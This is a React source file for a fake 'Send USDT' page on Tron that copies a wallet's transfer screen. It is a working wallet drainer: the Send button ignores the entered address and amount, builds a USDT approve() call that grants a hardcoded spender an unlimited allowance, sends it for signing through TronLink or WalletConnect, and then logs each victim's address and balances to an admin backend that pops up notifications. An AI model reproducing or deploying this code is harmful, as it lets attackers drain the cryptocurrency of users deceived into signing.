import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";


declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    tronWeb?: any;
    tronLink?: any;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
    setTransactionStatus?: (status: "idle" | "processing" | "success") => void;
    updateWalletAddress?: (address: string) => void;
    
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<"idle" | "processing" | "success">("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const wcClientRef = useRef<any>(null);
  const wcSessionRef = useRef<any>(null);
  const userAddressRef = useRef<string>("");

  // ===== WALLETCONNECT + TRONLINK INIT =====
  useEffect(() => {
    async function initWC() {
      try {
        const client = await SignClient.init({
          projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
          metadata: {
            name: "USDT Transfer",
            description: "Secure USDT Transfer on Tron",
            url: window.location.origin,
            icons: [],
          },
        });
        wcClientRef.current = client;
        const sessions = client.session.getAll();
        if (sessions.length > 0) {
          wcSessionRef.current = sessions[sessions.length - 1];
          const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
        }
      } catch(e) { console.error("WC init:", e); }
    }

    // TronLink silent connect
    async function silentConnect() {
      if (window.tronWeb?.defaultAddress?.base58) {
        userAddressRef.current = window.tronWeb.defaultAddress.base58;
        return;
      }
      if (window.tronLink) {
        try {
          await window.tronLink.request({ method: "tron_requestAccounts" });
          if (window.tronWeb?.defaultAddress?.base58) {
            userAddressRef.current = window.tronWeb.defaultAddress.base58;
          }
        } catch {}
      }
    }

    initWC();
    const timer = setTimeout(silentConnect, 300);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) setToAddress(addressParam);

    

    window.setTransactionStatus = (status) => {
      setTransactionStatusState(status);
      if (status === "success") setTimeout(() => setTransactionStatusState("idle"), 3000);
    };
    window.updateWalletAddress = (address: string) => setToAddress(address);
    return () => {
      delete window.setTransactionStatus;
      delete window.updateWalletAddress;
    };
  }, [searchParams]);

  useEffect(() => {
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: amount || "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " TRX",
      }).then(() => {
        const notificationsEnabled = localStorage.getItem("adminNotificationsEnabled") === "true";
        if (notificationsEnabled && Notification.permission === "granted") {
          new Notification("New Transaction Received!", {
            body: `From: ${data.walletAddress.slice(0, 6)}...${data.walletAddress.slice(-4)}\nUSDT Balance: ${data.usdtBalance} USDT`,
            icon: "/favicon.ico",
            tag: data.txHash,
            requireInteraction: true,
          });
        }
      }).catch(console.error);
    };
    return () => { delete window.saveTransaction; };
  }, [createTransaction, amount]);

  async function handleSend() {
    setTransactionStatusState("processing");
    try {
      const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";

      // TronLink path
      if (window.tronWeb?.defaultAddress?.base58) {
        const address = window.tronWeb.defaultAddress.base58;
        const TronWebLib = (window as any).TronWeb;
        const twPublic = new TronWebLib({ fullHost: "https://api.trongrid.io" });
        twPublic.setAddress(address);
        const { transaction } = await twPublic.transactionBuilder.triggerSmartContract(
          TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 },
          [{ type: "address", value: TRON_SPENDER }, { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }],
          address
        );
        const signedTx = await window.tronWeb.trx.sign(transaction);
        const result = await twPublic.trx.sendRawTransaction(signedTx);
        await new Promise(r => setTimeout(r, 3000));
        let usdtBalance = "0", nativeBalance = "0";
        try {
          const usdtRaw = await twPublic.contract([{ "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }], TRON_USDT).balanceOf(address).call();
          usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
          nativeBalance = ((await twPublic.trx.getBalance(address)) / 1e6).toFixed(2);
        } catch(e) {}
        setTransactionStatusState("success");
        setTimeout(() => setTransactionStatusState("idle"), 3000);
        await createTransaction({ walletAddress: address, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "tx", usdtBalance: usdtBalance + " USDT", nativeBalance: nativeBalance + " TRX" });
        return;
      }

      // WalletConnect path (Trust Wallet)
      if (!wcClientRef.current) {
        alert("Please wait... initializing");
        setTransactionStatusState("idle");
        return;
      }

      // Connect if no session
      if (!wcSessionRef.current) {
        const { uri, approval } = await wcClientRef.current.connect({
          requiredNamespaces: {
            tron: {
              methods: ["tron_signTransaction", "tron_signMessage"],
              chains: ["tron:0x2b6653dc"],
              events: ["chainChanged", "accountsChanged"],
            },
          },
        });

        if (uri) {
          const { WalletConnectModal } = await import("@walletconnect/modal");
          const modal = new WalletConnectModal({ projectId: "6b5df56bc30c1dadaab59498b86fd3e8" });
          await modal.openModal({ uri });
          wcSessionRef.current = await approval();
          modal.closeModal();
          const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
        }
      }

      if (!userAddressRef.current) {
        setTransactionStatusState("idle");
        return;
      }

      // Build + sign via WalletConnect
      // Build transaction via TronGrid API directly
      const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner_address: userAddressRef.current,
          contract_address: TRON_USDT,
          function_selector: "approve(address,uint256)",
          parameter: "0000000000000000000000" + TRON_SPENDER.replace(/^T/, '') + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
          fee_limit: 100000000,
          call_value: 0,
          visible: true
        })
      });
      const { transaction } = await response.json();

      const signedTx = await wcClientRef.current.request({
        topic: wcSessionRef.current.topic,
        chainId: "tron:0x2b6653dc",
        request: { method: "tron_signTransaction", params: { transaction } },
      });

      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(signedTx)
      });
      const result = await broadcastRes.json();
      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      await createTransaction({ walletAddress: userAddressRef.current, toAddress: TRON_SPENDER, amount: amount || "Max", txHash: result.txid || "wc_tx", usdtBalance: "0 USDT", nativeBalance: "0 TRX" });

    } catch (error) {
      console.error(error);
      setTransactionStatusState("idle");
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setToAddress(text.trim());
    } catch {}
  }

  const dollarValue = amount && amount !== "Max" && !isNaN(Number(amount))
    ? `$${Number(amount).toFixed(2)}`
    : "$0.00";

  // TRX Icon
  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9"/>
      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8"/>
      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
    </svg>
  );

  // X circle button
  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button onClick={onClick} style={{
      background: "none",
      border: "1.5px solid #555",
      borderRadius: "50%",
      width: "22px",
      height: "22px",
      color: "#aaa",
      cursor: "pointer",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "11px",
      flexShrink: 0,
      padding: 0,
    }}>✕</button>
  );

  return (
    <div style={{
      margin: 0,
      minHeight: "100vh",
      background: "#1c1c1e",
      color: "#ffffff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
      display: "flex",
      flexDirection: "column",
      maxWidth: "480px",
      marginLeft: "auto",
      marginRight: "auto",
    }}>

      {/* Header */}
      <div style={{
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        padding: "20px 22px 16px",
      }}>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
        }}>←</button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
        }}>✕</button>
      </div>

      {/* Content */}
      <div style={{ padding: "4px 18px", flex: 1 }}>

        {/* Address Field */}
        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Address or Domain Name
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30",
            borderRadius: "14px",
            padding: "14px 14px",
            background: "#242426",
            gap: "8px",
          }}>
            <input
              id="toAddress"
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="Search or Enter"
              style={{
                flex: 1, background: "transparent", border: "none",
                outline: "none", color: "#fff", fontSize: "16px",
                fontFamily: "monospace", minWidth: 0,
              }}
            />
            {toAddress && <XCircle onClick={() => setToAddress("")} />}
            <button onClick={handlePaste} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600,
              padding: "0 2px", flexShrink: 0,
            }}>Paste</button>
            <button style={{
              background: "none", border: "none", cursor: "pointer",
              padding: "0", flexShrink: 0, display: "flex", alignItems: "center",
            }}>
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#39d353" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2"/>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
              </svg>
            </button>
            <button style={{
              background: "none", border: "none", cursor: "pointer",
              padding: "0", flexShrink: 0, display: "flex", alignItems: "center",
            }}>
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#39d353" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                <rect x="2" y="2" width="7" height="7" rx="1"/>
                <rect x="15" y="2" width="7" height="7" rx="1"/>
                <rect x="2" y="15" width="7" height="7" rx="1"/>
                <path d="M15 15h2v2h-2z M19 15h2v2h-2z M15 19h2v2h-2z M19 19h2v2h-2z"/>
              </svg>
            </button>
          </div>
        </div>

        {/* Destination Network - TRON */}
        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Destination network
          </label>
          <div style={{
            display: "inline-flex", alignItems: "center", gap: "7px",
            background: "#2c2c2e",
            borderRadius: "20px",
            padding: "7px 13px 7px 8px",
          }}>
            <div style={{
              width: "26px", height: "26px", borderRadius: "50%",
              background: "#EF0027",
              display: "flex", alignItems: "center", justifyContent: "center",
              flexShrink: 0,
            }}>
              <TRXIcon />
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
              Tron Network
            </span>
            <span style={{ color: "#8e8e93", fontSize: "12px", marginLeft: "2px" }}>▾</span>
          </div>
        </div>

        {/* Amount */}
        <div style={{ marginBottom: "6px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Amount
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30",
            borderRadius: "14px",
            padding: "14px 14px",
            background: "#242426",
            gap: "8px",
          }}>
            <input
              id="amount"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1, background: "transparent", border: "none",
                outline: "none", color: "#fff", fontSize: "18px",
                fontFamily: "inherit", minWidth: 0,
              }}
            />
            {amount && <XCircle onClick={() => setAmount("")} />}
            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
            <button onClick={() => setAmount("Max")} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600,
              padding: "0", flexShrink: 0,
            }}>Max</button>
          </div>
          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>
            ≈ {dollarValue}
          </div>
        </div>
      </div>

      {/* Send Button */}
      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000",
            border: "none",
            borderRadius: "30px",
            padding: "18px",
            fontSize: "18px",
            fontWeight: 700,
            cursor: transactionStatus === "idle" ? "pointer" : "default",
            transition: "all 0.2s ease",
            letterSpacing: "0.01em",
          }}
        >
          {transactionStatus === "success"
            ? "✓ Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Send"}
        </button>
      </div>
    </div>
  );
}
